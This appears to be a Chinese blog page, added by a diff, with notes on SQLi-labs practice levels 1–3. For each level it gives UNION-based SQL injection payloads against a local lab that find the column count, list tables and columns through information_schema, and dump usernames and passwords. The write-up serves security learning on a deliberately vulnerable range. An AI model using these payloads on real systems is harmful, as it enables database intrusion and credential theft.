@@ -1,0 +1,241 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>sql靶场笔记 - 少莽</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="zhishaomang,"> 
+    <meta name="description" content="第一关1、判断闭合符号通过提交
+1？id=1、？id=1 and 1=1、？id=2
+
+发现有回显在id后面加入反斜杠发现是单引号闭合
+在url中加入单引号出现报错2、即单引号字符型注入，我们可以使,"> 
+    <meta name="author" content="John Doe"> 
+    <link rel="alternative" href="atom.xml" title="少莽" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+    
+    <meta name="twitter:card" content="summary"/>
+    <meta name="twitter:title" content="sql靶场笔记 - 少莽"/>
+    <meta name="twitter:description" content="第一关1、判断闭合符号通过提交
+1？id=1、？id=1 and 1=1、？id=2
+
+发现有回显在id后面加入反斜杠发现是单引号闭合
+在url中加入单引号出现报错2、即单引号字符型注入，我们可以使,"/>
+    
+    
+    
+    
+    <meta property="og:site_name" content="少莽"/>
+    <meta property="og:type" content="object"/>
+    <meta property="og:title" content="sql靶场笔记 - 少莽"/>
+    <meta property="og:description" content="第一关1、判断闭合符号通过提交
+1？id=1、？id=1 and 1=1、？id=2
+
+发现有回显在id后面加入反斜杠发现是单引号闭合
+在url中加入单引号出现报错2、即单引号字符型注入，我们可以使,"/>
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">少莽</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">sql靶场笔记</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">sql靶场笔记</h1>
+        <div class="stuff">
+            <span>六月 04, 2022</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <h2 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h2><p>1、判断闭合符号<br>通过提交</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">？id=<span class="number">1</span>、？id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span>、？id=<span class="number">2</span></span><br></pre></td></tr></table></figure>
+
+<p>发现有回显<br><img src="https://img-blog.csdnimg.cn/aeac2344921348248441438a73fc6777.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQkxfenNoYW9t,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>在id后面加入反斜杠发现是单引号闭合<br><img src="https://img-blog.csdnimg.cn/7253153a8a5c47479b1ebce3737e98e9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQkxfenNoYW9t,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+<p>在url中加入单引号出现报错<br><img src="https://img-blog.csdnimg.cn/06b88e7890c84132ae5bf51cce647535.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQkxfenNoYW9t,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>2、即单引号字符型注入，我们可以使用order by X来获取列数（例如：id=1‘order by 1–+这条语句的意思是查询users表中user_id为1的数据并按第一字段排行）<br>而我们在输入id=1’ order by 4–+的时候报错，那么说明数据有三列。<br><img src="https://img-blog.csdnimg.cn/1ac41732a7454790a703c5bddf24c726.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_30,text_Q1NETiBAQkxfenNoYW9t,size_12,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>3、接下来我们使用 union select 联合查询查看当前的数据库（union 运算符可以将两个或两个以上 select 语句的查询结果集合合并成一个结果集合显示，即执行联合查询）<br>即：id=-1’ union select 1,2,3–+也可以（id=1’ and 1=0 union select 1,2,3–+）目的就是使union前的查询无返回结果从而返回到执行联合查询的结果<br><img src="https://img-blog.csdnimg.cn/c369f0380f9f4c4a80325e59a770161d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQkxfenNoYW9t,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>判断出数据在2，3列<br>4、对数据库和表进行注入获取数据<br>先查询当前数据库：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,(select database()),3--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/fd4ae9af272841e18c5ecd14a7fbd1bf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQkxfenNoYW9t,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>然后我们用group_concat（）函数查看库中有哪些表：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&quot;security&quot;),3--+</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>information_schema：是数据库，其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。</strong><br><img src="https://img-blog.csdnimg.cn/9c799700c1bf4669a3a74a465d3690fe.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQkxfenNoYW9t,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>也可以在第三列里爆出表名：只需把union语句放到3的位置就行<br><img src="https://img-blog.csdnimg.cn/6691861e23fd480696522040bb030653.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQkxfenNoYW9t,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>5、查看users表里面的内容</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema=&quot;security&quot; and table_name=&quot;users&quot;)--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/73ffc0cc0ee24cad9ef13bfa6e8e001b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQkxfenNoYW9t,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>6、查看用户名和密码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,2,(select group_concat(username,password) from users)--+</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/9dd713998c9544129b0c4d9ed1536012.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQkxfenNoYW9t,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+<h2 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h2><p>1、查看回显<br>依旧是输入？id=1、？id=1 and 1=1、？id=2<br>后面加入反斜杠<br><img src="https://img-blog.csdnimg.cn/0b04e1d92ed74b03afc98e2725f2c743.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQkxfenNoYW9t,size_16,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>发现可以不用闭合直接查询<br>那么就跟第一关一样了，只不过不用加单引号。<br>2、使用order by<br>发现有三列<br>3、用union联合查询</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">-1</span> <span class="keyword">union</span> select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>--+</span><br></pre></td></tr></table></figure>
+<p>4、查看数据库</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-2/?id=-1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&quot;security&quot;),3--+</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>5、查看表中内容</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-2/?id=-1 union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema=&quot;security&quot; and table_name=&quot;users&quot;)--+</span></span><br></pre></td></tr></table></figure>
+<p>6、获取用户名和密码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-2/?id=-1 union select 1,2,(select group_concat(username,password) from users)--+</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h2><p>1、首先输入反斜杠，发现是单引号括号闭合<br><img src="https://img-blog.csdnimg.cn/9fccdedb85164dceb94e756c662aa14c.png" alt="在这里插入图片描述"><br>2、order by查询<br>发现依旧是三列<br>3、联合查询</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-3/?id=1&#x27;) and 1=2 union select 1,2,3--+</span></span><br></pre></td></tr></table></figure>
+<p>4、注入获取数据库和表的数据</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-3//?id=-1&#x27;) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&quot;security&quot;),3--+</span></span><br></pre></td></tr></table></figure>
+<p>5、查看user表里的内容</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-3//?id=-1&#x27;) union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema=&quot;security&quot; and table_name=&quot;users&quot;)--+</span></span><br></pre></td></tr></table></figure>
+<p>6、查看用户名和密码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/sqli-labs-master/Less-3//?id=-1&#x27;) union select 1,2,(select group_concat(username,password) from users)--+</span></span><br></pre></td></tr></table></figure>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title="0" data-url="http://dl.stream.qqmusic.qq.com/C400001OUQ6M2WeMRO.m4a?guid=8163272410&vkey=C6BFF6D45012D604172E87D65FF2374E512C935275765A15128BE77C8FB1CA7110313E815EB620C046DDFA4D4580F98DAE74B533BA12DACE&uin=1552804588&fromtag=120002"></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id="gitalk-container" class="comment link"
+		data-enable="false"
+        data-ae="false"
+        data-ci=""
+        data-cs=""
+        data-r=""
+        data-o=""
+        data-a=""
+        data-d="false"
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class="side">
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E5%85%B3"><span class="toc-number">1.</span> <span class="toc-text">第一关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E5%85%B3"><span class="toc-number">2.</span> <span class="toc-text">第二关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E5%85%B3"><span class="toc-number">3.</span> <span class="toc-text">第三关</span></a></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/live2d-widget-model-koharu/assets/koharu.model.json"},"display":{"superSample":2,"width":200,"height":400,"position":"left","hOffset":5,"vOffset":-84},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.8},"log":false});</script></body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+<!-- Google Analytics -->
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=zhishaomang"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'zhishaomang');
+</script>
+<!-- End Google Analytics -->
+
+
+</html>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/love.js"></script>
+<!--单击显示文字-->
+<script type="text/javascript" src="/js/click_show_text.js"></script>
+<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+<script type="text/javascript" src="/js/fireworks.js"></script>
+<!--浏览器搞笑标题-->
+<script type="text/javascript" src="/js/FunnyTitle.js"></script>
